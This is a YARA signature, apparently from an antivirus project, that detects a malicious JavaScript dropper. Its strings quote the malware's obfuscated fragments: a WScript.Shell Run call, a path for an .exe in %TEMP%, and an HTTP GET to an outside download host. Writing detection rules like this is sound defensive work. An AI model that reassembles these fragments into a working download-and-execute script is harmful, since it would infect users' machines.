rule sig_20160328_e9cf3c9a11b72865143314b35d92624f {
  meta:
    description = "datamaliciousorder - file 20160328_e9cf3c9a11b72865143314b35d92624f.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "a562019833925bd8f7e7652bdc77530102e7843af053de34a6505c653670a787"

  strings:
    $s1  = "function Xvnaqj() {return Absaphdr[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"nAkMwecIva.exe\";};" fullword ascii
    $s2  = "Irlkkpqrs[Etnsqfrgm](\"GET\", \"http://blackmountaintipis.com/mxn3aad\", false);" fullword ascii
    $s3  = "do {WScript[Nynqgwuti](Dsnhorty() * 11)} while (Irlkkpqrs[\"readystate\"] < 4 );" fullword ascii
    $s4  = "function Vwnwextjhq(Yhgjejm, Pxybuyl){return Yhgjejm - Pxybuyl;};" fullword ascii
    $s5  = "var Absaphdr = function Fizlakqwb() {return WScript[Qjbhsi](\"WScript.Shell\");}();" fullword ascii
    $s6  = "function Kjtdmyuf(Pcqpg){Absaphdr[\"Run\"](Pcqpg, Rydgqfgoi, Rydgqfgoi);};" fullword ascii
    $s7  = "function Azepr() {return ((Aqaskujppe == true) && (Aqaskujppe == Gaiitecyn)) ? 1 : Rydgqfgoi;};" fullword ascii
    $s8  = "function Dsnhorty(){return 22;};" fullword ascii
    $s9  = "function Hvbequnz(Iugtbx) {var Msaljwjoez = (1, 2, 3, 4, 5, Iugtbx); return Msaljwjoez;};" fullword ascii
    $s10 = "return Vwnwextjhq(Dseytdfu, Bkvidw);" fullword ascii
    $s11 = "Aqaskujppe = true; " fullword ascii
    $s12 = "var Gaiitecyn = false;" fullword ascii
    $s13 = "Gaiitecyn = true; " fullword ascii
    $s14 = "function Airpastb(){return Qjbhsi;};" fullword ascii
    $s15 = " while (Iynrh){" fullword ascii
    $s16 = "var Aqaskujppe = false;" fullword ascii
    $s17 = "function Phflkh(){return Weeypcokay;};" fullword ascii
    $s18 = "var Hyagcknjfr = false;" fullword ascii
    $s19 = "function Pwctaqc()" fullword ascii
    $s20 = "var Tijki = new this[\"Date\"]();" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}